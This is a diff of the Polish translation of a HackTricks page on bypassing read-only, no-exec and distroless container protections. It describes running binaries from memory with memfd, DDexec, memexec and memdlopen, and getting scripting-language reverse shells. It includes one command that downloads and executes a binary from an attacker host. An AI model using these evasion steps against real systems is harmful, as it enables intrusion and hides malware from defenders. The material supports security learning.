@@ -1,17 +1,18 @@
-# Obejście ochrony FS: tylko do odczytu / bez wykonania / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 {{#include ../../../banners/hacktricks-training.md}}
 
+
 ## Filmy
 
-W poniższych filmach znajdziesz techniki wspomniane na tej stronie wyjaśnione bardziej szczegółowo:
+W poniższych materiałach wideo znajdziesz techniki opisane na tej stronie wyjaśnione bardziej szczegółowo:
 
-- [**DEF CON 31 - Eksploracja manipulacji pamięcią Linuxa w celu ukrycia i unikania**](https://www.youtube.com/watch?v=poHirez8jk4)
-- [**Ukryte intruzje z DDexec-ng i in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
+- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
+- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
 
-## scenariusz tylko do odczytu / bez wykonania
+## read-only / no-exec scenario
 
-Coraz częściej spotyka się maszyny linuxowe zamontowane z **ochroną systemu plików tylko do odczytu (ro)**, szczególnie w kontenerach. Dzieje się tak, ponieważ uruchomienie kontenera z systemem plików ro jest tak proste, jak ustawienie **`readOnlyRootFilesystem: true`** w `securitycontext`:
+Coraz częściej można trafić na maszyny linuxowe zamontowane z ochroną systemu plików w trybie **read-only (ro)**, szczególnie w kontenerach. Dzieje się tak, ponieważ uruchomienie kontenera z ro filesystem jest tak proste, jak ustawienie **`readOnlyRootFilesystem: true`** w `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -26,45 +27,46 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-Jednak nawet jeśli system plików jest zamontowany jako ro, **`/dev/shm`** nadal będzie zapisywalny, więc to fałsz, że nie możemy nic zapisać na dysku. Jednak ten folder będzie **zamontowany z ochroną bez wykonania**, więc jeśli pobierzesz tutaj binarny plik, **nie będziesz mógł go wykonać**.
+Jednak nawet jeśli system plików jest zamontowany jako ro, **`/dev/shm`** nadal będzie zapisywalny, więc to nieprawda, że nie możemy nic zapisać na dysku. Ten katalog będzie jednak **zamontowany z ochroną no-exec**, więc jeśli pobierzesz tu binarkę, **nie będziesz mógł jej uruchomić**.
 
 > [!WARNING]
-> Z perspektywy red teamu, to **utrudnia pobieranie i wykonywanie** binarnych plików, które nie są już w systemie (jak backdoory czy enumeratory takie jak `kubectl`).
+> Z perspektywy red teamu, to **utrudnia pobieranie i uruchamianie** binarek, które nie są już obecne w systemie (np. backdoors lub enumeratory takie jak `kubectl`).
 
-## Najłatwiejsze obejście: Skrypty
+## Najprostsze obejście: skrypty
 
-Zauważ, że wspomniałem o binarnych plikach, możesz **wykonać dowolny skrypt**, o ile interpreter jest w maszynie, jak **skrypt powłoki**, jeśli `sh` jest obecny, lub **skrypt** **python**, jeśli `python` jest zainstalowany.
+Zauważ, że mówiłem o binariach — możesz **uruchomić dowolny skrypt**, pod warunkiem że interpreter jest na maszynie, np. **shell script** jeśli jest obecne `sh` lub **python script** jeśli jest zainstalowany `python`.
 
-Jednak to nie wystarczy, aby wykonać swój binarny backdoor lub inne narzędzia binarne, które możesz potrzebować uruchomić.
+To jednak nie zawsze wystarczy, by uruchomić twój binarny backdoor lub inne narzędzia binarne, których możesz potrzebować.
 
-## Obejścia pamięci
+## Ominięcia w pamięci
 
-Jeśli chcesz wykonać binarny plik, ale system plików na to nie pozwala, najlepszym sposobem jest **wykonanie go z pamięci**, ponieważ **ochrony nie mają tam zastosowania**.
+Jeśli chcesz uruchomić binarkę, a system plików na to nie pozwala, najlepszym sposobem jest **uruchomienie jej z pamięci**, ponieważ te zabezpieczenia nie obowiązują tam.
 
-### Obejście FD + syscall exec
+### FD + exec syscall bypass
 
-Jeśli masz w maszynie potężne silniki skryptowe, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binarny plik do wykonania z pamięci, przechować go w deskryptorze pliku pamięci (`create_memfd` syscall), który nie będzie chroniony przez te zabezpieczenia, a następnie wywołać **`exec` syscall**, wskazując **fd jako plik do wykonania**.
+Jeśli masz na maszynie zaawansowane silniki skryptowe, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binarkę do uruchomienia z pamięci, zapisać ją w deskryptorze pliku w pamięci (`create_memfd` syscall), który nie będzie objęty tymi zabezpieczeniami, a następnie wywołać **`exec` syscall** wskazując **fd jako plik do wykonania**.
 
-W tym celu możesz łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Możesz przekazać mu binarny plik, a on wygeneruje skrypt w wskazanym języku z **binarnym plikiem skompresowanym i zakodowanym w b64** z instrukcjami do **dekodowania i dekompresji** w **fd** utworzonym przez wywołanie syscall `create_memfd` oraz wywołanie syscall **exec**, aby go uruchomić.
+W tym celu możesz łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Przekazujesz mu binarkę, a on wygeneruje skrypt w wybranym języku z **binarką skompresowaną i zakodowaną w b64** oraz instrukcjami do **dekodowania i dekompresji** do **fd** utworzonego wywołaniem `create_memfd` i wywołaniem **exec** syscall, aby ją uruchomić.
 
 > [!WARNING]
-> To nie działa w innych językach skryptowych, takich jak PHP czy Node, ponieważ nie mają one żadnego **domyślnego sposobu na wywoływanie surowych syscalli** z poziomu skryptu, więc nie można wywołać `create_memfd`, aby utworzyć **fd pamięci** do przechowywania binarnego pliku.
->
-> Ponadto, utworzenie **zwykłego fd** z plikiem w `/dev/shm` nie zadziała, ponieważ nie będziesz mógł go uruchomić, ponieważ zastosuje się **ochrona bez wykonania**.
+> To nie działa w innych językach skryptowych, takich jak PHP czy Node, ponieważ nie mają one domyślnego sposobu wywoływania surowych syscalli z poziomu skryptu, więc nie da się wywołać `create_memfd`, aby utworzyć **memory fd** do przechowania binarki.
+> 
+> 
+> Co więcej, utworzenie zwykłego **fd** z plikiem w `/dev/shm` nie pomoże, ponieważ nie będziesz mógł go uruchomić z powodu obowiązywania **no-exec protection**.
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika, która pozwala na **modyfikację pamięci własnego procesu** poprzez nadpisanie jego **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika pozwalająca **modyfikować pamięć własnego procesu** przez nadpisanie jego **`/proc/self/mem`**.
 
-W ten sposób, **kontrolując kod assemblera**, który jest wykonywany przez proces, możesz napisać **shellcode** i "mutować" proces, aby **wykonać dowolny arbitralny kod**.
+W ten sposób, **kontrolując kod assembly**, który jest wykonywany przez proces, możesz zapisać **shellcode** i „zmodyfikować” proces, aby **wykonywał dowolny kod**.
 
 > [!TIP]
-> **DDexec / EverythingExec** pozwoli Ci załadować i **wykonać** własny **shellcode** lub **dowolny binarny plik** z **pamięci**.
+> **DDexec / EverythingExec** pozwala załadować i **wykonać** własny **shellcode** lub **dowolną binarkę** z **pamięci**.
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-Aby uzyskać więcej informacji na temat tej techniki, sprawdź Github lub:
+Aby uzyskać więcej informacji o tej technice sprawdź Github lub:
 
 {{#ref}}
 ddexec.md
@@ -72,39 +74,46 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) jest naturalnym krokiem w następstwie DDexec. To **demonizowany shellcode DDexec**, więc za każdym razem, gdy chcesz **uruchomić inny binarny**, nie musisz ponownie uruchamiać DDexec, możesz po prostu uruchomić shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać nowe binarne do załadowania i uruchomienia**.
+[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. To **DDexec shellcode uruchomiony jako demon**, więc za każdym razem, gdy chcesz **uruchomić inną binarkę** nie musisz ponownie uruchamiać DDexec — możesz po prostu uruchomić memexec shellcode za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przesyłać nowe binarki do załadowania i uruchomienia**.
 
-Możesz znaleźć przykład, jak użyć **memexec do wykonywania binarnych z PHP reverse shell** w [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Przykład użycia **memexec do uruchamiania binarek z PHP reverse shell** znajdziesz w [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-Z podobnym celem do DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) umożliwia **łatwiejszy sposób ładowania binarnych** w pamięci, aby później je wykonać. Może nawet pozwolić na ładowanie binarnych z zależnościami.
+O podobnym celu do DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) pozwala na **łatwiejszy sposób ładowania binarek** do pamięci w celu ich późniejszego uruchomienia. Może nawet umożliwić załadowanie binarek z zależnościami.
 
 ## Distroless Bypass
 
-### Czym jest distroless
+Aby uzyskać dedykowane wyjaśnienie **czym właściwie jest distroless**, kiedy pomaga, kiedy nie, oraz jak zmienia post-exploitation tradecraft w kontenerach, zobacz:
 
-Kontenery distroless zawierają tylko **najmniejsze niezbędne komponenty do uruchomienia konkretnej aplikacji lub usługi**, takie jak biblioteki i zależności uruchomieniowe, ale wykluczają większe komponenty, takie jak menedżer pakietów, powłoka czy narzędzia systemowe.
+{{#ref}}
+../../privilege-escalation/container-security/distroless.md
+{{#endref}}
 
-Celem kontenerów distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez eliminację niepotrzebnych komponentów** i minimalizację liczby podatności, które mogą być wykorzystane.
+### What is distroless
+
+Kontenery distroless zawierają tylko **minimalne komponenty niezbędne do uruchomienia konkretnej aplikacji lub usługi**, takie jak biblioteki i zależności runtime, ale wyłączają większe komponenty, takie jak menedżer pakietów, shell czy narzędzia systemowe.
+
+Celem kontenerów distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez usunięcie niepotrzebnych komponentów** i zminimalizowanie liczby podatności, które można wykorzystać.
 
 ### Reverse Shell
 
-W kontenerze distroless możesz **nawet nie znaleźć `sh` lub `bash`**, aby uzyskać zwykłą powłokę. Nie znajdziesz również binarnych takich jak `ls`, `whoami`, `id`... wszystko, co zwykle uruchamiasz w systemie.
+W kontenerze distroless możesz **nawet nie znaleźć `sh` lub `bash`** aby uzyskać zwykły shell. Nie znajdziesz też binarek takich jak `ls`, `whoami`, `id`... wszystkiego, co zwykle uruchamiasz w systemie.
 
 > [!WARNING]
-> Dlatego **nie** będziesz w stanie uzyskać **reverse shell** ani **enumerować** systemu tak, jak zwykle.
+> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
 
-Jednak jeśli skompromitowany kontener uruchamia na przykład aplikację flask, to python jest zainstalowany, a zatem możesz uzyskać **Python reverse shell**. Jeśli uruchamia node, możesz uzyskać Node rev shell, i to samo z większością **języków skryptowych**.
-
-> [!TIP]
-> Używając języka skryptowego, możesz **enumerować system** korzystając z możliwości języka.
-
-Jeśli nie ma **ochron `read-only/no-exec`**, możesz wykorzystać swój reverse shell do **zapisywania w systemie plików swoich binarnych** i **wykonywania** ich.
+Jednak jeśli skompromitowany kontener uruchamia np. aplikację Flask, to python jest zainstalowany i w związku z tym możesz zdobyć **Python reverse shell**. Jeśli uruchomiony jest node, możesz zdobyć Node rev shell, i to samo dotyczy praktycznie każdego **języka skryptowego**.
 
 > [!TIP]
-> Jednak w tego rodzaju kontenerach te zabezpieczenia zazwyczaj będą istnieć, ale możesz użyć **wcześniejszych technik wykonania w pamięci, aby je obejść**.
+> Używając języka skryptowego możesz **enumerate the system** korzystając z możliwości tego języka.
 
-Możesz znaleźć **przykłady** na temat **wykorzystania niektórych podatności RCE** do uzyskania **reverse shells** języków skryptowych i wykonywania binarnych z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Jeśli nie ma zabezpieczeń **`read-only/no-exec`**, możesz wykorzystać reverse shell do **zapisania w systemie plików swoich binarek** i ich **uruchomienia**.
+
+> [!TIP]
+> Jednak w tego typu kontenerach te zabezpieczenia zazwyczaj będą istnieć, ale możesz użyć **wcześniejszych technik wykonania w pamięci, aby je obejść**.
+
+Możesz znaleźć **przykłady** pokazujące, jak **wykorzystać niektóre podatności RCE** aby uzyskać **reverse shells** dla języków skryptowych i wykonywać binarki z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+
 
 {{#include ../../../banners/hacktricks-training.md}}
